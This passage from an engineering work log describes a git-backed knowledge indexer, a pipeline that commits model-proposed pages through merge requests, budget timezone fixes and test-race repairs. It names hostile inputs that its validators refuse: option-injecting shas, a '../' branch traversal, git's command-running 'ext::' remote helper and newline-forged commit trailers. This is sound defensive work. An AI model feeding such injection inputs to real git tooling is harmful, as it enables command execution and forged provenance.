   size is the one a reader should see); the sentence was wrong, and both directions are now pinned by
   `estimate.test.ts`.
3. *Migration 0017's comment overstates its unique key.* `(run_id, model, created_at)` was described
   as catching "a replay within the same microsecond, which is exactly what a double-fired backfill
   is". It is not: `created_at` defaults to `now()`, which in PostgreSQL is the **transaction's** start,
   so two backfill passes in two transactions write two different timestamps and the constraint never
   fires. What makes a second pass a no-op is `handler_executions`, per the replay's own design. The
   constraint's real value is a duplicate **inside one transaction**. technical/03 now says that;
   the migration is applied and forward-only, so its comment is left and carried here for the next
   migration to correct at the line.

#### WP-19 — review round 2 (REQUEST_CHANGES): one bad character in a settings field, three different failures

**The state decision 8 exists for reached three callers and only one of them handled it.** An
`organizations.timezone` that `assertTimeZone` refuses — a fixed offset, which ES2024 `Intl` accepts
and DST arithmetic cannot use — makes `budgetWindowStart` **throw**. The ledger caught that and failed
open to UTC with a named warning; the *guard* and the *budgets read* did not, so the same row would
have failed a `stage.execute` job into its retry loop and answered **500** on the dashboard built to
show the misconfiguration. The substitution is now one function, `resolveBudgetTimezone`
(`cost/window.ts`), and each caller reports it in its own register: the ledger logs by name, the route
logs and serves the substituted window, the guard simply does not block on a calendar it could not
compute. Asserted end to end — the e2e sets the org zone to `+02:00` and the read still answers 200
with the UTC window; mutating `findProjectTimezone` back to the raw column turns that case red
(`expected 500 to be 200`). Standing rule 9's shape: an obligation three paths can discharge needs one
arbiter, and rule 20's, because the failure was *closed* where the product wants open.

**`BudgetRepository.listForProject` is deleted rather than wired up.** Its docblock claimed it served
`GET /api/projects/:id/budgets`; the route reads through `cost-queries.ts`, so its only caller was the
contract suite and the scope filter existed twice (rules 31/44/63). Deleting it is the right half of
the choice because the store's loader **writes**: `applicable` inserts the window row and takes it
`for update`, which is what serialises two runs charging one budget and is exactly what a `GET` must
not do. So the store is the charge path, the projection is the read path, and that is now stated at
both ends instead of being a duplication nobody had named.

**The duplicate-model caveat is closed by construction rather than written down.** A derivation with
two entries for one `(run_id, model)` would be deduplicated by `cost_entries`' unique key and
**summed** into the rollup, so `sum(entries) = sum(rollups)` — the property this work package is
measured by — would be false for that run. `foldByModel` now folds before pricing: usage adds, a
reported cost adds, and two absent costs stay absent (never `0 + n`, which would read as a reported
zero). Unreachable from `normaliseModelUsage` today, which builds from `Object.entries`; "today" is a
fact about one caller and the invariant is a fact about the ledger (rule 44).

**And the new route now has its own 401 case**, per route rather than per surface — WP-15h's shape, and
the failure it catches (an endpoint added without `requirePermission`) is invisible to every
authenticated assertion beside it.

**On the reviewer's mutation-copy warning, checked rather than assumed:** none of this work package's
mutation results came from a copied tree. Every mutant was written **in place** in the working tree
(python/Edit write, `diff` against a backup to prove it landed, restore and `diff -q` to prove it was
gone), so a symlinked `node_modules` resolving `@platform/*` back to the original sources cannot
apply — the mutant *is* the original source while it runs. The one mutant that survived
(`cost-queries.ts` keyed on the budget alone, round 1) was proved live by the same `diff` **and** by
its eventual death against the strengthened test, which is the canary the reviewer's recipe adds
separately.

#### WP-19 — review round 3 (APPROVE with one minor): the guard half was dead code a mutant restored

`resolveBudgetTimezone` reached three callers in round 2 and only two of them were **tested**. The
reviewer mutated the guard's call back to the raw column on a canaried copy and it survived the whole
unit+contract tier: no tier admitted a stage under a fixed-offset org zone, because
`ledger.e2e.test.ts` sets one only *after* the task has settled. `guard.test.ts` now has
*"substitutes UTC for a zone it cannot compute in, rather than throwing"*, and it is a **behaviour**
case rather than a "does not throw" one — the row is charged at the UTC month start, so only a guard
that read that window finds it. Re-derived here in place: a planted `throw` canary fails 10 of 11
cases (the module is reached), the raw-column mutant then fails **one, by name**, and the restore is
green. Rule 3's whole point, one work package later: the fix and the test that proves it are two
deliverables, and fixing three call sites made the third *feel* covered.

Two residuals stated at their lines rather than fixed: `appendEntries`' `do nothing` is asymmetric
with `applyRollups`' fold and is the backstop rather than the guarantee (the guarantee is
`foldByModel`, in the derivation); and the price job's window-closing update cannot close a window
onto itself because `price_list` is `unique (model_id, effective_from)`, so `lead()` never returns a
row's own instant — the guarantee is the index's, not the statement's.

### WP-18a — the git-backed vault and the indexer job

**What exists now.** `createGitVaultSource` (`packages/infrastructure/src/knowledge/git-vault.ts`) —
`rev-parse`, `ls-tree -r -l -z`, one `cat-file --batch`, `merge-base --is-ancestor`, no working tree;
`createGitMirrorCredentials` (`packages/integrations/src/bindings/git-mirror.ts`) and the
`gitCredential` declaration it reads off a `ProviderRegistration`; the `knowledge.index` job, its two
trigger handlers and `createKnowledgeIndexRuntime`
(`packages/application/src/knowledge/index-job.ts`); and `composeKnowledgeIndexing`
(`apps/server/src/knowledge.ts`), registered by `runtime.ts` on every worker. The application ring's
`VaultSource`/`VaultSnapshot` port is **unchanged**, as TD-026 requires. Nine integration cases assert
the acceptance against `kb_documents`/`kb_chunks` rows after a real `git clone --mirror` from a real
seeded remote, driven through real pg-boss.

**The three answers the brief asked for by name.**

*Which event each trigger listens to.* **`task.created`** for "task start" — emitted once by the
intake saga before any stage runs, where `task.stage.entered` fires per stage and `task.queued` only
when a task waits. For "after every merge", **both** events technical/07 names, and they carry
different payloads on purpose: `mr.merged` enqueues **without** a commit and `default_branch.moved`
**pins `new_head`**. The reason is in the contracts: `mrPayload` carries `mr.branch`, which is the
*source* branch, and there is no target — so the platform cannot tell from an `mr.merged` whether the
merge landed on the default branch, and pinning `merge_commit_sha` would make every feature-branch
merge fail the ancestry guard and report `vault_unavailable`, which reads as a fault. Unpinned, such a
merge finds the same commit and reports `unchanged` at the `kb_index_state` early exit. **That exit is
cheap, not free, and my first note said "free" — the reviewer was right.** `KnowledgeIndexer` compares
the commit *after* `vault.read` returns, so an unchanged run has already paid for the `remote update`,
the `ls-tree` and the `cat-file --batch` of the whole vault; what it saves is the parse and the write
transaction. Moving the comparison ahead of the read needs a head-only question the port does not
have (a second method, on a port TD-026 left unchanged) and would skip the fetch that makes the answer
current — which is the one thing the after-merge trigger exists for. Stated at the line instead.

*How the fetch credential travels, and where its audit is.* Binding rows → `SecretStore` →
`createGitMirrorCredentials` → `{username, password}` → **environment of one `git` subprocess**
(`GIT_USER`/`GIT_PASS` plus a `GIT_CONFIG_*` credential helper, the launcher's own
`#gitCredentialEnv` shape) → nowhere else. **There is no audit row, and that is decided rather than
skipped**: technical/06 § "Outbound: actions" scopes `IntegrationActionExecutor` to *action calls* on
a provider port — shadow mode, idempotency and rate limits are about mutations to a provider's state
— and this is the git transport: no adapter, no API call, nothing changed on the far side, nothing to
replay. The precedent is in this repository: the launcher's `updateMirror` fetches with a credential
and writes no audit row either. What is recorded is the *run* — `knowledge.index.rebuilt` with the
commit and the counts, and a refusal's reason string in the `IndexReport` and the log.

*The singleton assertion on PostgreSQL, by name.*
`test/integration/knowledge/git-vault-index.integration.test.ts` › *"collapses a burst of triggers
onto one run, through pg-boss’s own singleton key"*: three `enqueueKnowledgeIndex` calls answer
`enqueued, coalesced, coalesced`, one job runs, one `knowledge.index.rebuilt` row exists. **And the
first version of that test was not evidence** — measured, not guessed: with `singletonKey` deleted
from `enqueueKnowledgeIndex` it still passed, because pg-boss folds a burst onto the *null* key just
as happily under `stately`. The key is only load-bearing **across** projects, so the test now also
enqueues a second project's index while the first is queued and expects `enqueued`, and the in-memory
half (`packages/infrastructure/src/jobs/knowledge-index.test.ts` › *"never lets one project’s index
run block another’s"*) was rewritten to go through the same function for the same reason. That mutant
now kills both.

**`stately`, and the two policies it was chosen against.** "Singleton per project" is a phrase, not a
policy. `singleton` caps only the *active* side, so five merges queue five identical runs. `exclusive`
admits nothing while a job is live and therefore **loses** a merge that arrives a millisecond after a
run started reading — that run's tree predates it and nothing comes back. `stately` keeps exactly one
trailing job, and since a job is a wake-up that re-validates on fire (TD-004) the trailing run re-reads
the branch head. Measured on the in-memory adapter: the criterion's assertion (*one in flight + two
triggers → one further run*) fails by name under `singleton`, `exclusive` **and** `standard`, and
passes only under `stately`.

**Decisions a reviewer should check rather than assume.**

- **A provider declares which of its secrets `git` authenticates with** (`ProviderRegistration.gitCredential`,
  GitLab: `{passwordField: 'token', username: 'oauth2'}`, citation on the type). The alternative —
  minting through `GitProviderPort.mintCredential` — was rejected on a fact: GitLab's
  `mint_credentials` defaults to **false**, so a mint-only path leaves the default deployment with no
  credential at all. Registration refuses a field that is not in `secretFields`, a blank username, and
  the declaration on a non-git provider.
- **The byte bound is an aggregate, not per document.** `ls-tree -l` carries each blob's size, so the
  read refuses *before* buffering anything when the vault exceeds 64 MiB. A per-document cap would
  make this adapter refuse a page `createFilesystemVaultSource` indexes, and TD-026 decision 9 is
  explicit that the two must not disagree about the same repository.
- **The fetch is skipped only when the pinned commit is already an ancestor of the default branch**,
  not merely present. TD-026 says "already present"; present is not enough, because a sha can be in
  the mirror as an MR head while the branch has not moved, and answering `unavailable` for a merge
  commit the remote already has would turn the after-merge trigger into a refusal.
- **The `git` child gets an allow-list environment**, not the platform process's own — which carries
  `APP_SECRET_KEY` and `ANTHROPIC_API_KEY` — plus `GIT_TERMINAL_PROMPT=0`, without which a missing
  credential becomes a prompt on a stdin nobody is attached to: an index job that hangs until its
  lease expires rather than one that fails with a reason. **And the credential goes only to the two
  commands that open a connection** (`clone`, `remote update`) — round 1 attached it to every child,
  which put it in four more process environments for nothing *and* let the "the password really is
  supplied" assertion pass off a local `rev-parse`. The positive half of that assertion now names a
  network command, and a second case holds the plumbing reads to having no credential at all.
- **Untrusted arguments are shape-checked before they are arguments.** A `commitSha` from a provider
  event must match `^[0-9a-f]{7,64}$` (a value starting with `-` is an *option* to git), a branch name
  a conservative pattern **plus an explicit `..` refusal** (round 1's docblock claimed the pattern
  refused traversal "by construction" and it did not — `.` is in the class, so `a/../../HEAD` matched;
  measured, git itself exits 128 on that ref, so the outcome was already `unavailable`, and what the
  check buys is a refusal that is ours), and `projects.repo_url` an allow-list of `https?`/`file` —
  because git's remote helpers include `ext::<command>`, which executes it. `file://` is admitted
  deliberately: it is what lets the integration tier fetch from a real seeded remote. The allow-list
  **excludes git's scp-style `git@host:path`**, which `egressHostOfRepoUrl` supports, so a project
  written that way indexes to a permanent `vault_unavailable`; stated at the pattern and in
  technical/12 rather than silently. The **mirror directory name** is checked too, before it is joined
  to a path — unreachable today (`idSchema`, then a uuid cast), and rule 55 is about exactly that
  reasoning: it is the one untrusted-shaped value in the read that becomes a path.
- **`ROLE=indexer` became a worker** (`role.ts`), the same correction WP-15g made for `runner` and for
  the same reason: pg-boss hands a job to any subscribed worker, so a role that did not dispatch would
  take no index job. No role now reports an unimplemented workload; `roleIsIdle` is false for every
  role, and the field and the warning are kept for the next role named before its work package.
- **The pool floor is 13 at N=1, not 12.** The `knowledge.index` worker is a fifth job worker holding
  one connection for its write transaction (the git fetch and the tree read happen *before* the
  transaction opens, so no connection is held across a clone). `POOL_RESERVATIONS.knowledge = 1`,
  shape `2N + 11`; `.env.example` keeps `APP_DB_POOL_MAX=14` (one of slack) and the e2e harness's
  `12` had to become `13` — which is how the arithmetic was noticed.

**Review round 1: APPROVE with five minors and three nits, all applied.** The two that changed
behaviour rather than prose are the credential's scope (above) and the mirror-key check; the two that
changed a false sentence are the `..` claim and *"`unchanged` is free"*; the rest are the scp-style
note, Q63's residual moved to the line that creates the mirror, technical/07 gaining the audit and
credential sentences, and one integration assertion that **could not fail** — `SECRET_MARKER`, the
bytes *inside* a symlink's target, which git never reads (rule 43). That line now asserts the absent
`kb_documents` row instead, and the case's discriminating assertion is on the target's *path*, which
is what a mode-120000 read would actually store.

**Measurements taken on this tree** (rule 86 — nothing below is a prediction). Five mutants on a copy
of the adapter, calibrated unmutated at 24/24: reading mode `120000` kills *"reads the four indexed
path classes"* and *"lists a symlink and a gitlink and reads neither"*; never refreshing kills 11;
dropping the ancestry guard kills exactly one; putting the token in an `http.extraHeader` argument and
writing it into the mirror's `config` each kill *"keeps the credential out of the argument vector and
out of the mirror’s own config"*. In the integration tier, with the Edit tool and reverted: defaulting
the mirror root instead of refusing kills *"refuses by name when no mirror root is configured"*,
reading symlink blobs kills the rows-level symlink case, and removing the missing-vault warning kills
the new e2e case in `composition.e2e.test.ts`. `git ls-tree -r -l -z` output format recorded from
`git version 2.50.1`: `<mode> SP <type> SP <object> SP<padded size>TAB<path>`, NUL-separated, size `-`
for a gitlink; `cat-file --batch` frames `<sha> SP blob SP <size>\n<bytes>\n` and answers
`<request> SP missing` — both parsed by pure functions with their own tests.

**Rule 83 — sentences the fix falsified, found by grep and corrected.** `filesystem-vault.ts`'s
docblock (*"Asking git instead would mean spawning a process from inside a read, which TD-025 keeps out
of this ring"* — the sibling now does exactly that, and `ctags.ts` already did); `role.ts`'s
`PENDING_WORK_PACKAGE.indexer` and the two paragraphs around it; `planner.ts`'s `headPaths` (*"WP-18
supplies this when it wires the indexer to a checkout"* — WP-18a wires it to a **mirror** and does
**not** supply `headPaths`, so the sentence now says what is actually missing: a caller, not a tree);
`apps/server/src/pipeline.ts` twice (the `.agentic/pipeline.yml` read *"needs a workspace"*, and the
`prompts/<stage>.md` override *"needs the default branch read WP-18 wires"*); `docs/TODO.md`'s
`git`-in-the-image item; technical/07's *"before WP-18 wires the job"*. Seven sites, five of them in
code.

**Q63 (the mirror disk budget), decided as "state it rather than half-build it".** Part (2)'s
recommended **default** is what the code does — no ceiling, no eviction — reached by not building the
knob. Part (1) cannot be done in this build: product/19 §20's storage gauge does not exist (nothing
reports database bytes either), so there is no number for a mirror line to join; the note on Q63 says
where the bytes are when someone builds it. Part (3) is TD-026's deferral and is in `docs/TODO.md`.
The status note on the question also makes its last sentence **live** rather than hypothetical:
`task.created` triggers an index for every project with a git binding, so the first task of each
project clones its repository onto the platform's disk with nothing bounding the total.

**Assumptions, stated because the docs did not settle them.** (a) TD-026 decision 5 says "no
`VaultSource` is composed"; this composes `unavailableVaultSource`, a **refusal object** in the shape
`unavailableClaudeRunner` already uses, because the criterion asks the *job* to name the missing
variable and something has to carry that sentence. (b) A mirror root that does not exist is refused
rather than created: a typo'd path would otherwise be created and filled, and an index built from it
looks exactly like one built from the volume the operator meant. (c) The job's index-run report is
logged, not persisted; `kb_index_state` has no column for the parser version or the last reason, and
adding one is WP-18b's `kb_health_reports` work.

**What this half does not do, and nobody should read as done.** No librarian pipeline, no proposals,
no apply policy, no knowledge MR, no nightly hygiene (WP-18b). Nothing has indexed a project inside
`platform-app`: *"the image has `git`"* and *"the indexer can use it there"* remain two claims, and
`docs/TODO.md` says so. The adapter has never fetched from a real GitLab over HTTPS — every fetch in
every tier is `file://` — so the credential helper's *effect* is untested even though its plumbing and
its non-leakage are asserted; that is the same gap `docs/TODO.md`'s blobless-clone item lives in.

**WP-18a — Needs measurement** (found by the review, and neither is a defect; both are claims this
change asserts less strongly than it reads):

1. **The in-flight half of the singleton criterion has never been asked of pg-boss.** *One active run
   plus two triggers → one trailing run* is asserted only against the in-memory adapter
   (`packages/infrastructure/src/jobs/knowledge-index.test.ts`), because the fake runs handlers inside
   `drain` and can therefore enqueue *while a job is active*; the PostgreSQL case asserts the
   **queued-side** fold (`enqueued, coalesced, coalesced`) and the per-project key. The pg-boss claim
   is therefore **inferred** from the fake's divergence register, which says its only known `stately`
   divergence is that it reuses `created` where pg-boss uses `retry` — i.e. stricter. To measure it
   properly: a worker whose handler blocks on a promise the test resolves, two enqueues while it is
   blocked, then count the runs.
2. **A `file://` fetch never invokes the credential helper**, so every credential assertion in every
   tier is about *plumbing* — the value is in the right environment and in no argv or config — and
   none is about *effect*. Nothing has ever proved that git actually authenticates with it. Measuring
   it needs a local authenticated HTTP remote (`git http-backend` behind a basic-auth server over
   `http://`) and would also close the "never fetched from a real host" gap above at unit-tier cost.

### WP-18b — the librarian pipeline, proposals, the apply policy and nightly hygiene

**What exists now.** The `librarian` stage is back in the shipped templates as data
(`packages/domain/src/pipeline/templates.ts`), producing a **new artifact type**
`LibrarianProposals`; `curateProposals` + `dispositionFor` + `vaultPathOf`
(`packages/domain/src/knowledge/proposals.ts`) are BD-018's policy and BD-025's containment as pure
functions; `computeKbHealth` (`packages/domain/src/knowledge/health.ts`) is the report; the
application ring has the curation job, the apply job, the nightly pass, the decide command and their
runtime (`packages/application/src/knowledge/{librarian,apply,hygiene,decide,runtime}.ts`) plus the
`KnowledgeProposalStore` port, its in-memory double and its contract suite; `PostgresProposalStore`
is the adapter; `GitProviderPort.commitFiles` is the new port method with the GitLab adapter, the
fake, a contract case and a recorded fixture; `apps/server/src/routes/kb.ts` serves the four
endpoints the SPA has called since WP-20; and `apps/server/src/knowledge.ts` composes all of it.
Migration **0018** adds the `artifact_type` label and `kb_health_reports`.

**The four answers the brief asked for by name.**

*Where the stage sits and what triggers it.* After `retrospective`, before `done`, in the shared
`mergeTail` — so all three shipped templates have it — with `produces: LibrarianProposals` and
`requires: [RetroReport]`. Nothing new triggers it: the interpreter's ordinary fall-through enters it
when the retrospective approves, and a project turns it off by disabling the stage (asserted). It
runs with the task in **`retro`**, which needed one edge in the Task state machine: `retro → retro`,
because `enterStage` sets `active` and `retro` has no edge to it by design — a merged task never goes
back to work. `startLibrarianCuration` is the command, beside `startRetrospective`.

*How a proposal becomes a commit, and where its provenance lives.* `artifact.created` →
(handler enqueues, nothing else) → `knowledge.proposals` job: redact, curate, write `kb_proposals`
rows, emit `knowledge.proposal.created`, and enqueue `knowledge.apply` if the policy auto-applied
anything → `knowledge.apply` job (`stately`, `singletonKey: project:<id>` — BD-012 serialises
knowledge commits per repository): read what is waiting, resolve the project's bindings through the
**pipeline's own loader**, `commitFiles` and `openMergeRequest` through `IntegrationActionExecutor`,
then one transaction marking the rows `applied` and emitting `knowledge.proposal.applied`.
Provenance lives in three places, deliberately: the **row** (`task_id`, `run_id`, `evidence`,
`significance`), the **commit message** (`Agentic-Source: task <ticket key> run <id>`, technical/07's
trailer, one line per source run, with the ticket key resolved from `tasks` rather than the task
uuid), and the **audit row** the executor writes (`commit_files`, carrying the *paths* and not the
page bytes).

*Which census gaps closed.* Four, exactly: `/api/projects/{}/kb/tree`, `/kb/doc`, `/kb/proposals` and
`/kb/proposals/{}/{}`. `ADMITTED_GAPS` lost those entries and the census gained a positive case that
names them (rule 10: "not in the gap list" is satisfied by a path the sweep never found).

*What the fake runner emits, and which composition the e2e used.* `FakeClaudeRunner` would emit
whatever `scenarios['librarian']` says and **never read the prompt** (rule 82) — and it is composed
with a sink that stores nothing, so the bytes this work package cares about would not exist. So
`test/e2e/pipeline/librarian.e2e.test.ts` uses `agent: 'real-over-fake-cli'`: the production
`createClaudeRunner` over a scripted CLI process, inside a real `apps/server` instance, with the real
pg-boss, the real binding loader and the production `PostgresProposalStore`. That is what makes the
redaction case evidence rather than decoration — see the measurement below.

**Decisions a reviewer should check rather than assume.**

- **A branch and a merge request, always — never the default branch.** technical/07 step 4 offers a
  direct push and BD-018/product/07 say `auto_apply` "commits directly"; this build does neither.
  **Q66** is filed with the reasoning and implements the recommendation: BD-025 reads agent
  configuration (the vault included) from the default branch, so a direct push is the one write that
  changes the rules every later run is governed by with nobody in between. `auto_apply` therefore
  means *no queue entry*, not *no review*.
- **"Approved" is `queued` with a decision on it. There is no sixth status.** technical/02's machine
  is `scored → (discarded | queued | auto_applied) → (applied | rejected)`, so `listAwaitingApply` is
  `auto_applied` **or** (`queued` and `decided_at is not null`), and both become `applied` when a
  commit carries them. `isAwaitingApply` is the predicate; the adapter's `where` clause is the second
  spelling, and the contract suite runs the first over the rows and demands the store agree (rule 41).
- **`delta` is the page's whole content, not a patch**, and `target_path` is **vault-relative**. The
  first because there is no workspace and no patch engine on the apply path; the second so that
  containment is a property of the join (`vaultPathOf`) rather than of a check on model output. Both
  are in the prompt, which is why it was rewritten and `ROLE_PROMPT_VERSIONS.librarian` is now `2`.
- **The branch is `agentic/knowledge/<date>-<batch>`**, not technical/07's `<date>`: a date alone is
  not a name a second batch on the same day can use, and the discriminator is the batch's earliest
  proposal id — stable across a retry (so the idempotency key replays) and different for the next
  batch.
- **`create` versus `update` is decided from the *index* at apply time**, not from the `action` the
  model chose when the proposal was written. The index is fresher; when it is wrong the provider
  refuses the whole commit (`invalid_request`) and nothing is overwritten.
- **A shadow task's proposals are queued, never auto-applied** (BD-021), and a proposal below
  `discard_below` is **written** as `discarded` rather than dropped silently — technical/07 calls that
  path "audit only", and a drop nobody can see is not an audit.
- **An inverted configuration (`discard_below > proposal_above`) resolves towards the queue.**
  `knowledgeApplyThresholds` lowers `discard_below` to meet `proposal_above`, so the overlap queues
  rather than discards and the band is empty (nothing auto-applies). Dropping is invisible; queueing
  is cheap and visible; neither writes to the repository.
- **The knowledge guards run at `preValidation`.** Fastify validates before `preHandler`, so
  `/kb/doc?path=` and `/kb/proposals/:id/:decision` answered an anonymous caller `400` describing
  their own shape. The census (rule 68's per-route 401) is what found it. The cost is that the guard
  sees unvalidated params, so the project hook hands the permission check an id only when it is a
  uuid — a malformed one never reaches a query.
- **The nightly pass makes no git call and deletes nothing**, and that is structural: `hygiene.ts`
  holds no `PipelineIntegrationsPort` and issues no delete. The integration test plants an expired
  page a *human* wrote and asserts it is still indexed afterwards.

**Measurements taken on this tree** (rule 86 — nothing below is a prediction).

1. **`artifacts.data` stores model output unredacted, and the e2e proves it.** `createClaudeRunner`
   returns `structuredOutput: validated.data` untouched (`claude-runner.ts:645`), so the planted
   `ANTHROPIC_API_KEY` the scenario writes into a proposal is present verbatim in the `artifacts` row
   — `expect(JSON.stringify(artifact)).toContain(PLANTED_MODEL_KEY)` passes. TD-012's write list names
   *artifacts*. It is **discovered work**, not fixed here: the fix is on the executor's write path and
   covers every artifact type. What this work package does close is the two sinks it owns — the same
   key is absent from `kb_proposals.delta` and from the commit, with the placeholder present in both
   (rule 42, both directions).
2. **A `date` column read through `pg` moves a day backwards east of UTC.** `readHealthInputs`
   returned `2024-12-31` for a row written as `2025-01-01` on this machine (Europe/Prague), because
   `pg` parses `date` into a `Date` at *local* midnight and `toISOString()` then shifts it. Found by
   the contract suite's postgres run; fixed by asking PostgreSQL for `to_char(expires,'YYYY-MM-DD')`.
3. **The in-memory proposal store was kinder than the adapter, in the way rule 1 forbids.**
   `PostgresProposalStore.insert` originally omitted `decided_by`, `decided_at` and
   `applied_commit_sha`, so every seeded "already decided" row lost its decision and
   `listAwaitingApply` returned rows the predicate excludes. The double keeps whatever it is handed;
   the contract suite's first postgres run is what found it.
4. **`ALTER TYPE … ADD VALUE` appends, and the enum parity test compares in order.** The label is
   added `before 'ShadowReport'` so the database's order matches the zod enum's.
5. **The e2e's first version waited on the wrong line** (rule 50): it settled on `task.completed`,
   which is the *stage's* ending, and read the proposals two queue hops before they existed —
   `auto_applied` instead of `applied`, and a second batch that carried two pages instead of one. The
   harness now waits for the row it asserts.
6. **Three more job workers is three more pooled connections, and the e2e tier found it as somebody
   else's failure.** `POOL_RESERVATIONS.knowledge` is **4** now (the index worker plus
   `knowledge.proposals`, `knowledge.apply`, `knowledge.hygiene`), so the floor for `ROLE=all` at
   dispatch concurrency 1 is `2N + 14` = **16**, `.env.example` ships **17** and
   `DATABASE_CONFIG_DEFAULTS.poolMax` is 17. Two things fell out of it, both measured on this tree:
   the e2e tier died with `error: sorry, too many clients already` **inside `sse.e2e.test.ts`** —
   the tier starts whole instances in parallel against one container whose `max_connections` was the
   default 100, and the harness now starts it with `max_connections=300`, which is the harness
   following the product rather than a workaround; and `outbound-shape.e2e.test.ts` failed with an
   `UndersizedPoolError` because it **restated** the shipped default as the literal `13` (backlog
   22's shape, in a test whose subject is the dispatcher). It reads `DATABASE_CONFIG_DEFAULTS.poolMax`
   now, so the next work package that adds a worker does not have to find it again.

**Rule 83 — sentences this change falsified, found by grep and corrected.**
`templates.ts`'s "**No `librarian` stage**" (the reason it was cut is now the reason it is back);
`interpreter.property.test.ts`'s foreign-stage arbitrary, which used `librarian` as an id "not in the
template"; `indexer.ts` twice (the KB health report is **not** built from the invalid list, and the
parser version is still not wired to a column — WP-18b writes to the vault, which is what that
sentence promised); `planner.ts`'s prompt-override note (the reason changed again: there is a
default-branch read now, and what is missing is that it answers the four indexed path classes);
`docs/TODO.md`'s "`KnowledgeIndexer` is not a pg-boss job", stale since WP-18a; and technical/07,
/08, /12, /02 and /03, each amended where it described the gap. Seven code sites, five documents.

**Review round 1: REQUEST_CHANGES with one major, three minors and a nit — all five applied.**

- **Major (BD-022, rule 40).** The provenance trailer interpolated `tasks.ticket_key` — provider
  text with no cap and no charset — into a **line-structured** commit message and MR body, both
  unbounded. A key carrying a newline forges extra `Agentic-Source:` lines; a long one makes a
  multi-megabyte provider request. Fixed at the **join**: `provenanceTokenOf` refuses anything
  outside `[A-Za-z0-9._/-]` or over 64 characters and falls back to the task's uuid — refusal, not
  escaping, the same answer `vaultPathOf` gives a model-chosen path — and the run id goes through it
  too, because "it is a uuid in the column" is a claim about the column. `commitFilesRequestSchema
  .message` (16 KiB) and `mergeRequestDraftSchema.description` (32 KiB) now carry `.max()`, and
  `knowledgeWrites` **parses** both requests, because a bound only TypeScript knows about is not a
  bound at a boundary (rule 14) and because that parse is the seam rule 22 asks for. Asserted from
  both sides, plus a hostile key driven through the whole pass; **mutation-checked** on a copy —
  calibrated 20/20, and `value ?? fallback` kills 7 cases by name.
- **Minor (rule 83).** `auth/rbac.ts` claimed the project id "is validated as a UUID by the route
  schema before this runs" and that it builds a `preHandler`; the four knowledge guards run at
  `preValidation`. Both sentences now name that case and point at `projectOf`.
- **Minor.** The proposal queue's cursor was `created_at` alone while one curation writes every row
  with the same timestamp, so a page boundary inside a batch dropped the rest of it *silently* (a
  short page reads as the last one). It is the keyset `(created_at, id)` now — a `ProposalCursor` in
  the port, a row comparison in the adapter, an opaque `"<created_at>|<id>"` in the route parsed as
  untrusted input (a malformed cursor is a 400) — with a contract case that pages through a
  same-timestamp batch and asserts the pages together are the batch.
- **Minor.** `knowledgeBranchName` took its date from the clock, so a retry after midnight renamed
  the branch, both idempotency keys missed and a second MR opened. Both halves come from the batch
  now (the earliest proposal's `created_at` and id); the clock survives only as the fallback for an
  empty batch, which the caller returns before reaching.
- **Nit (rule 83).** `consumption.ts` and technical/07 step 5 still said
  `knowledge.proposal.applied → indexer job`. It is unconsumed **by decision**: an applied proposal
  is a commit on a branch, the indexer reads the default branch (BD-025), and the rebuild happens on
  `mr.merged`. Both say so now.

**Review round 2: APPROVE with two minors and two nits — all applied.**

- **TD-012 again, one field along.** `decide.ts` redacted the maintainer's `delta` and **not** the
  rejection `reason`, which goes to `events.payload` — a column TD-012 names — with the same
  argument sitting eight lines above it. The reason is redacted now and asserted in both directions.
- **The `edit` path bypassed the page budget.** `decideKbProposalRequestSchema.delta` was unbounded,
  so a maintainer's replacement reached the row, the commit and every later context pack at up to
  the HTTP body limit while a *model's* page was capped at 64 KiB. `MAX_PROPOSAL_DELTA_BYTES` moved
  to `@platform/contracts` — it is a wire bound now as well as a curation one, and two constants for
  one budget is rule 41's shape — the request schema caps **code units** at the boundary and
  `decideKnowledgeProposal` caps **bytes**, which is the unit the row carries. Both edges asserted.
- **The MR body's refusal was safe by construction and unevidenced** (rule 43): the apply test's
  recorder kept `{branch, target, title}` and dropped `description`, so the second document built
  from the ticket key was asserted by nothing. It is recorded and carries the same two assertions
  the commit message does.
- Two nits: the `commitFilesRequestSchema` docblock had drifted above `MAX_COMMIT_MESSAGE_CHARS` and
  documented the constant; and the fake git provider's divergence register listed 9 before 8. Both
  fixed — and the fake's header sentence *"Git itself is deliberately absent"* was falsified by
  divergence 9 (rule 83), so it now says which half is absent and which the commits API supplies.

#### ci-fix — the librarian e2e bound the commit, not the row

CI run **`34722271238`** failed `test/e2e/pipeline/librarian.e2e.test.ts` ›
*"serves the queue, the tree and a document, and commits what a maintainer approves"* with
`expected 'queued' to be 'applied'` — on the **docs-only** commit `3eaf34b`, while the same job was
green on `24efdc7`, which is the shape of a race rather than of a defect.

**Mechanism, read off the failure and then reproduced.** The test waited on `pipeline.git.commits`
and asserted the **row** on the next line. `knowledge.apply` calls `commitFiles` and
`openMergeRequest` and *then* writes `status = 'applied'` in a transaction of its own, so
"the provider has the commit" is true one transaction before "the row says applied". Nothing about
the ordering is random; only the rate is (standing rule 76), and a loaded CI runner is all it takes.
Standing rule **50** in its usual form: bound the line you assert, not one that precedes it.

**The fix** waits on the row — `waitFor` over `pipeline.proposals()` until the target row is
`applied` — and then asserts the commit, which the row now implies. No assertion was weakened and
one was **added**: `applied_commit_sha === second.sha`, the tie the old ordering could not make
because it read the row before the writer had put a sha on it.

**Rule 49's sweep, over every `test/e2e/` assertion that reads a row after observing a provider
call.** Four candidates, one more defect: `agent-run.e2e.test.ts` waited on the workpad comment and
then asserted `integration_actions` rows, which the executor writes *after* the call returns — the
same window, and `every(status === 'ok')` is true of an empty set as well, so the assertion was not
a measurement either. It waits for the `upsert_workpad` audit row now. The other two are already
right and now say so at the line: this file's first case waits on the row inside `startMerged` and
asserts the commit afterwards, and the cost ledger's reconciliation already waits for
`cost_entries` rather than inferring them from a task state.

**Rule 3, on a copy** (`zz` copies of the e2e and of `support/pipeline.ts`, both deleted): the
harness copy wraps the fake's `commitFiles` so it records the commit and then holds the call open
for 1.5 s — a fake-side hook, never a sleep in the test — which makes the window deterministic.
**Calibrated 1/1 with the fix; with the pre-fix ordering restored it fails by name with CI's own
message**, `expected 'queued' to be 'applied'`.

**Assumptions, stated because the docs did not settle them.** (a) The librarian's four actions map
onto two git actions — `add`/`update`/`deprecate` write the page, `no-op` writes nothing — and
nothing ever produces a `delete`, which is why `commitActionSchema` has no such member (product/05:
a deprecated page is kept). (b) `edit` is an approval carrying the maintainer's replacement text,
not a fourth state. (c) The health report's findings are capped at 100 per pass, ordered by kind, and
the dropped count is logged — the row is `jsonb` and the input is a whole vault. (d) One proposal per
